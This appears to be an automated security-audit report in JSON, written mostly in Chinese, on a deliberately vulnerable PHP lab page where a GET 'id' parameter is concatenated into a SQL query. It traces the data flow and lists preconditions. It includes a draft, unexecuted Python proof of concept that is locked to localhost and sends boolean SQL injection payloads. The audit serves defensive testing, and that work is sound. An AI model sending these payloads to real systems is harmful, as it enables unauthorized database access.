@@ -1,0 +1,146 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "SQLI-001",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "SQLI-001"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "medium",
+    "reason": "输入可控（第 6/8 行）、拼接与执行（第 14/15 行）、输出观察点（第 20/22/28 行）在包内静态证据完整且无任何过滤；扣分项为第 3 行 include 的连接实现与 PHP/MySQL 运行版本均未提供，连接层是否统一转义或设置字符集未知，故只能给 medium，且无任何实测运行证据。"
+  },
+  "findings": [
+    {
+      "finding_id": "SQLI-001-F1",
+      "vulnerability_type": "SQL注入",
+      "locations": [
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "if(isset($_GET['id']))"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$id=$_GET['id'];"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 14,
+          "line_end": 14,
+          "quote": "$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 15,
+          "line_end": 15,
+          "quote": "$result=mysql_query($sql);"
+        },
+        {
+          "fragment_id": "SQLI-001",
+          "line_start": 28,
+          "line_end": 28,
+          "quote": "print_r(mysql_error());"
+        }
+      ],
+      "data_flow": [
+        "入口：第 6 行 if(isset($_GET['id'])) 直接放行，片段内没有任何认证、会话校验、CSRF token 或频率限制；该文件本身即顶层请求处理逻辑，因此 id 参数对能访问到该路径的调用者可达。",
+        "来源：第 8 行 $id=$_GET['id']; 原样取出 GET 值，未做 trim、intval、(int) 强转、addslashes、mysqli_real_escape_string 或正则白名单，也没有长度或字符集检查。",
+        "危险构造：第 14 行把 $id 直接插入 WHERE 子句的单引号字符串值位置（id='$id'），属于值位置的字符串字面量拼接；单引号进入后闭合字面量，其后文本成为 SQL 语法，LIMIT 0,1 只限制返回行数、不限制谓词。",
+        "执行：第 15 行 mysql_query($sql) 执行拼接后的完整语句，无参数化（无 prepared statement / 占位符），因此注入文本进入数据库解析阶段。",
+        "观察与输出：第 16 行 mysql_fetch_array 取首行，第 17 行 if($row) 为真时第 20/22 行输出 username 与 password；为假时走第 27-28 行，把 mysql_error() 打印进黄色容器，可作为错误型/布尔型观察点。",
+        "持久化旁路：第 10-12 行以追加方式把 'ID:'.$id 写入 result.txt，该写入不改变 SQL 语义，不是注入汇点，但会原样记录可控输入（见 risk_notes）。",
+        "跨阶段关联：第 3 行 include(\"../sql-connections/sql-connect.php\") 的实现未随包提供（审计说明另存于 context/sqli-connect.php），因此连接建立时的字符集设置、magic-quotes 模拟、或在连接层统一转义 id 的可能性无法排除；在已提供的片段内，从第 8 行到第 14 行没有任何过滤步骤，参数名 id 与查询字段 users.id 的对应关系由第 14 行的 WHERE id='$id' 直接给出。"
+      ],
+      "principle": "典型的一阶（非二阶）SQL注入：顶层脚本把 GET 参数 id 原样拼进 SELECT 语句的单引号字符串值位置，攻击者用单引号闭合字面量后即可改变 WHERE 谓词或追加语句，再由过时的 mysql_query 直接执行；全程无参数化、无白名单、无转义。注入点位于值位置（字符串字面量）而非标识符或常量，因此不需要表名/列名可控即可成立。",
+      "impact": "在查询可达的数据库范围内可任意读取：布尔/UNION/报错三种手法都能绕过 WHERE 限定，读取 users 表或其他库表；若该查询被用于登录判断，可造成认证绕过；第 28 行回显 mysql_error() 使报错注入成为可能。数据库账号权限过高时还能扩展到写入或文件读写（片段未体现，需按部署确认）。未证实可执行系统命令。",
+      "preconditions": [
+        "Web 服务可访问该 PHP 入口，且第 3 行 include 的 ../sql-connections/sql-connect.php 存在并能建立 mysql_* 连接（该文件未提供，需补证）。",
+        "PHP 运行环境提供 mysql_* 扩展：PHP 5.x 默认具备，PHP 7.0 起 mysql_* 已移除（仅极旧兼容层或第三方扩展可用），需以实际版本确认，否则第 15 行会致命错误、注入路径不可达。",
+        "id 参数无需认证即可到达（片段内无任何身份或 token 校验）。",
+        "users 表中存在基线 id 记录（按片段默认取 id=1），否则只能观察空行，布尔对照退化。",
+        "上游无反代/WAF 把 id 强制转成整数或以白名单改写。"
+      ],
+      "counterexamples": [
+        "若 sql-connect.php 在连接后设置正确字符集并对 $id 调用 mysql_real_escape_string，单引号会被转义，本注入不成立——该文件未提供，属于未知条件，不能默认排除也不能默认成立。",
+        "若部署环境开启 magic_quotes_gpc（PHP < 5.4）会为 GET 值自动加反斜杠，可能使本载荷失效；需按实际 PHP 版本与配置确认。",
+        "若入口前存在 WAF 或 URL 重写把 id 限制为 ^[0-9]+$，引号不可达；片段本身无此约束。",
+        "若 $id 在拼接前被 intval() 或 (int) 转换（第 8 行并没有），则不构成注入。",
+        "若目标行不存在，第 17 行 if($row) 走 else 分支，只输出可能为空的 mysql_error()，布尔差异被掩盖，此时应记为观察不足而不是注入不成立。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "Python 3",
+        "code": "#!/usr/bin/env python3\n\"\"\"Draft (not executed) validation script for parent sample SQLI-001.\n\nScope: local authorized lab only. The script reads the audited PHP entry\npoint's GET parameter \"id\" and compares the business-result region between a\nplain numeric baseline and a minimal boolean contrast pair.\n\nServer-side facts used (local line numbers of normalized_samples/SQLI-001.php):\n  L6   if(isset($_GET['id']))\n  L8   $id=$_GET['id'];\n  L14  $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\n  L15  $result=mysql_query($sql);\n  L16  $row = mysql_fetch_array($result);\n  L20  echo 'Your Login name:'. $row['username'];\n  L22  echo 'Your Password:' .$row['password'];\n  L28  print_r(mysql_error());\n\nOnly the injected predicate is varied. No UNION, no table enumeration, no\ndata export and no write operation is performed.\n\"\"\"\nimport argparse\nimport http.cookiejar\nimport json\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nALLOWED_HOSTS = {\"localhost\", \"127.0.0.1\", \"::1\"}\nROW_MARK = \"Your Login name:\"\nPASS_MARK = \"Your Password:\"\nERR_OPEN = 'color= \"#FFFF00\">'\nERR_CLOSE = \"</font>\"\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    \"\"\"Refuse to follow redirects so a login bounce cannot be mistaken for output.\"\"\"\n\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(req.full_url, code,\n                                     \"redirect refused -> %s\" % newurl,\n                                     headers, fp)\n\n\ndef build_opener():\n    jar = http.cookiejar.CookieJar()\n    return urllib.request.build_opener(\n        urllib.request.HTTPCookieProcessor(jar), NoRedirect())\n\n\ndef load_cookie(path):\n    \"\"\"Cookie comes from a local file; it is never printed.\"\"\"\n    if not path:\n        return \"\"\n    with open(path, \"r\", encoding=\"utf-8\") as fh:\n        data = json.load(fh)\n    if not isinstance(data, dict) or not isinstance(data.get(\"cookie\"), str):\n        raise SystemExit(\"session file must be a JSON object with a 'cookie' string\")\n    return data[\"cookie\"]\n\n\ndef check_target(base):\n    parts = urllib.parse.urlsplit(base)\n    if parts.scheme not in (\"http\", \"https\"):\n        raise SystemExit(\"base must be http(s), got %r\" % parts.scheme)\n    if parts.hostname not in ALLOWED_HOSTS:\n        raise SystemExit(\"only local hosts are allowed, got %r\" % parts.hostname)\n    return parts\n\n\ndef fetch(opener, base, path, param, value, cookie, timeout):\n    query = urllib.parse.urlencode({param: value})\n    url = base.rstrip(\"/\") + path + (\"&\" if \"?\" in path else \"?\") + query\n    req = urllib.request.Request(url, method=\"GET\")\n    req.add_header(\"User-Agent\", \"sqli-001-draft/1.0 (local lab)\")\n    if cookie:\n        req.add_header(\"Cookie\", cookie)\n    try:\n        with opener.open(req, timeout=timeout) as resp:\n            return {\"url\": url, \"status\": resp.getcode(),\n                    \"body\": resp.read().decode(\"utf-8\", \"replace\")}\n    except urllib.error.HTTPError as exc:\n        body = exc.read().decode(\"utf-8\", \"replace\") if exc.fp else \"\"\n        return {\"url\": url, \"status\": exc.code, \"body\": body}\n\n\ndef parse_region(body):\n    \"\"\"Extract the audited business-result region: L20/L22 row block or L27-L28 error block.\"\"\"\n    region = {\"row_found\": False, \"login\": None, \"password\": None,\n              \"error_text\": None}\n    for raw in body.replace(\"\\r\", \"\").split(\"\\n\"):\n        line = raw.strip()\n        if ROW_MARK in line:\n            region[\"row_found\"] = True\n            region[\"login\"] = line.split(ROW_MARK, 1)[1].strip()\n        elif PASS_MARK in line:\n            region[\"row_found\"] = True\n            region[\"password\"] = line.split(PASS_MARK, 1)[1].strip()\n    idx = body.find(ERR_OPEN)\n    if idx != -1:\n        tail = body[idx + len(ERR_OPEN):]\n        end = tail.find(ERR_CLOSE)\n        region[\"error_text\"] = (tail if end == -1 else tail[:end]).strip()\n    return region\n\n\ndef main(argv=None):\n    ap = argparse.ArgumentParser(\n        description=\"SQLI-001 boolean-contrast draft for GET parameter id\")\n    ap.add_argument(\"--base\", default=\"http://127.0.0.1:8080\")\n    ap.add_argument(\"--path\", required=True,\n                    help=\"path of the audited PHP entry point, e.g. /sqli-001/index.php\")\n    ap.add_argument(\"--param\", default=\"id\")\n    ap.add_argument(\"--session\", default=None,\n                    help=\"JSON file {'cookie': '...'} for the tester's own account\")\n    ap.add_argument(\"--timeout\", type=float, default=10.0)\n    ap.add_argument(\"--out\", default=None, help=\"write the JSON report here\")\n    args = ap.parse_args(argv)\n\n    check_target(args.base)\n    cookie = load_cookie(args.session)\n    opener = build_opener()\n\n    cases = [\n        (\"baseline_numeric\", \"1\"),\n        (\"true_predicate\", \"1' AND '1'='1\"),\n        (\"false_predicate\", \"1' AND '1'='2\"),\n    ]\n    observed = {}\n    for name, value in cases:\n        resp = fetch(opener, args.base, args.path, args.param, value,\n                     cookie, args.timeout)\n        observed[name] = {\"status\": resp[\"status\"],\n                          \"region\": parse_region(resp[\"body\"]),\n                          \"body_len\": len(resp[\"body\"])}\n\n    base_r = observed[\"baseline_numeric\"][\"region\"]\n    true_r = observed[\"true_predicate\"][\"region\"]\n    false_r = observed[\"false_predicate\"][\"region\"]\n\n    checks = {\n        \"baseline_row_present\": bool(base_r[\"row_found\"]),\n        \"true_predicate_same_row\": bool(\n            true_r[\"row_found\"]\n            and true_r[\"login\"] == base_r[\"login\"]\n            and true_r[\"password\"] == base_r[\"password\"]),\n        \"false_predicate_no_row\": not false_r[\"row_found\"],\n    }\n    report = {\n        \"sample_id\": \"SQLI-001\",\n        \"target\": {\"base\": args.base, \"path\": args.path, \"param\": args.param},\n        \"cases\": observed,\n        \"checks\": checks,\n        \"injection_observed\": all([checks[\"baseline_row_present\"],\n                                   checks[\"true_predicate_same_row\"],\n                                   checks[\"false_predicate_no_row\"]]),\n    }\n    text = json.dumps(report, ensure_ascii=False, indent=2)\n    print(text)\n    if args.out:\n        with open(args.out, \"w\", encoding=\"utf-8\") as fh:\n            fh.write(text + \"\\n\")\n    if not checks[\"baseline_row_present\"]:\n        print(\"precondition failed: baseline row absent (missing row, login bounce \"\n              \"or wrong path); do not read this as a safe result\", file=sys.stderr)\n        return 2\n    return 0\n\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.8+（仅标准库：argparse、http.cookiejar、json、urllib.request/error/parse）",
+          "可访问的本地靶场实例（默认 http://127.0.0.1:8080），以及该入口的 URL 路径",
+          "目标环境已创建 users 表基线记录（默认 id=1），且 mysql_* 兼容层可用"
+        ],
+        "parameters": [
+          "--base：靶场基址，默认 http://127.0.0.1:8080，脚本校验 scheme 与 host 仅允许 localhost/127.0.0.1/::1",
+          "--path：第 3 行 include 所在入口脚本的实际 URL 路径，如 /sqli-001/index.php，必须人工按部署填写，不能从片段推断",
+          "--param：请求参数名，默认 id（取自第 6/8 行 $_GET['id']）",
+          "--session：可选，JSON 文件 {\"cookie\": \"...\"}，用于需要同会话的部署；无认证时留空",
+          "--timeout：单请求超时秒数，默认 10.0",
+          "--out：把三次请求的解析报告写入本地 JSON 文件，便于留证"
+        ],
+        "steps": [
+          "部署并确认靶场：记录源提交、PHP 版本、MySQL 版本、mysql_* 兼容方式与 Web 路径，确认第 3 行 include 成功。",
+          "在同一会话下先发基线请求 id=1，解析 'Your Login name:' 与 'Your Password:' 行，确认基线行存在（不存在则先修复前置条件，不要下结论）。",
+          "只把 id 换成真条件载荷 1' AND '1'='1，其余不变，确认返回行与基线逐字符一致。",
+          "只把 id 换成假条件载荷 1' AND '1'='2，确认不出现行块（走第 27-28 行 else 分支），并记录黄色容器内是空串还是报错文本。",
+          "可选对照：id=1'（单引号）观察是否产生 MySQL 语法报错，用于佐证输入未被转义；不作为成功条件。",
+          "保存三次完整响应体（脱敏后）、请求 URL（含载荷）、时间戳与环境信息到工作包4证据目录。"
+        ],
+        "expected_observation": "1) 基线 id=1 返回 'Your Login name:' 与 'Your Password:' 行块（第 17-22 行分支），黄色错误容器内无 SQL 报错；2) 真条件载荷 1' AND '1'='1 返回与基线完全相同的 username/password，说明注入谓词为真且输出格式未变；3) 假条件载荷 1' AND '1'='2 不返回行块，走第 27-28 行 else 分支，容器内可能为空串或 MySQL 报错文本；4) 三次仅 id 值不同，路径、方法、会话一致，因此行块出现/消失只能由 SQL 谓词真假解释，而不是登录跳转或接口错误；5) 若三次都无行块且状态码为 302 或返回登录页，应记为认证/路径前置条件失败，不能当作注入不成立。",
+        "success_criteria": "1) 三次请求都使用代码中的 GET 参数 id、同一路径与同一会话，且 Host 属 localhost/127.0.0.1/::1；2) 能解析出 'Your Login name:' 行的值，且真条件载荷的值与基线逐字符相同；3) 假条件载荷解析为 row_found=False，与真条件结果不同；4) 只有 2) 与 3) 同时成立，才把该数据流记为布尔型 SQL 注入已触发；仅出现第 28 行报错文本只能证明输入进入了 SQL 且未被转义，需补充正常/假条件对照后才算完整证据；5) 保存三次响应原文（或脱敏片段）作为观察证据，HTTP 200、响应长度或脚本退出码均不作为成功条件。",
+        "limitations": [
+          "脚本未运行，execution_status=未运行；行块与报错解析依赖实际页面的 HTML 结构（第 19-23、27-29 行），若模板被改写需人工调整解析标记。",
+          "--path 与是否带尾斜杠、参数如何拼进 URL 必须按部署填写；片段未给出对外 URL 映射。",
+          "若部署需要登录，--session 的 cookie 来源需人工准备；cookie 不写入版本库、不在输出中打印。",
+          "本脚本只做布尔对照，不枚举库表、不读取额外数据；即使触发也只证明谓词可控，不证明可导出全部数据。",
+          "若 include 的连接文件在连接层统一转义 id，脚本将观察不到真假差异，此时结论应为『该路径被有效防护』而非脚本失败。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "sql-connections/sql-connect.php（第 3 行 include）的完整内容：连接方式、字符集设置、是否对 $_GET 统一转义或模拟 magic_quotes。",
+    "db-creds.inc 与数据库账号权限（是否仅 SELECT、是否可 UNION 跨库读取）。",
+    "PHP 版本与 mysql_* 扩展可用性（PHP 7.0+ 已移除 mysql_*，将改变可达性）。",
+    "该入口的对外 URL 路径与 Web 根映射，用于 POC 的 --path 参数。",
+    "users 表结构与基线记录（id=1 是否存在），以及 security 库的表清单（仅用于判断影响范围，不用于数据导出）。",
+    "部署层是否有 WAF/URL 重写对 id 施加整数白名单。",
+    "error_reporting(0) 与 display_errors 的实际配置，决定第 28 行报错是否可见。"
+  ],
+  "risk_notes": [
+    "第 10-12 行把未净化的 id 追加写入 result.txt（位于 Web 目录），存在日志注入与可控内容落盘风险；若该文件可被 Web 读取还会造成信息暴露，独立于 SQL 注入。",
+    "第 28 行回显 mysql_error()，即使 error_reporting(0) 关闭了 PHP 警告，MySQL 错误文本仍可能泄露库名、表名与语法细节。",
+    "第 4 行 error_reporting(0) 隐藏了 PHP 层错误，可能掩盖第 15 行查询失败，使运维误判接口正常。"
+  ],
+  "quality_notes": [
+    "第 15 行使用 PHP 7.0 起已移除的 mysql_* 接口，属过时 API，不应作为注入成立证据，但决定运行环境兼容性。",
+    "第 14 行对数值型 id 使用字符串比较（id='$id'），依赖 MySQL 隐式类型转换，属实现质量问题。",
+    "第 16 行未检查 mysql_query 返回值即调用 mysql_fetch_array，查询失败时会产生额外警告（被第 4 行抑制）。",
+    "查询硬编码 LIMIT 0,1，只返回首行，不利于分页或完整结果集，但与注入判定无关。"
+  ],
+  "limitations": [
+    "本次仅做静态审计，未部署、未发送任何 HTTP 请求，runtime_evidence 为空；POC 为草案且 execution_status=未运行。",
+    "结论覆盖范围为已提供的 normalized_samples/SQLI-001.php 片段；第 3 行 include 的连接文件未提供，无法验证连接层转义与字符集，因此结论为『待验证』而非『确认』。",
+    "第 14 行到第 15 行的数据流在同一顶层脚本内闭合，未涉及跨请求存储后再拼接的二阶路径，故不宣称二阶注入。",
+    "无法从片段确定 MySQL 版本与 sql_mode，UNION/报错注入的具体可行载荷可能不同；POC 只用布尔对照以降低依赖。",
+    "POC 的行块解析标记取自第 195-199 行与第 203-205 行的字面量，若实际部署模板不同需人工适配。",
+    "未验证用户可控输入是否会以其他方式（如 result.txt 回读）二次进入 SQL，缺少该读取代码。"
+  ],
+  "runtime_evidence": []
+}
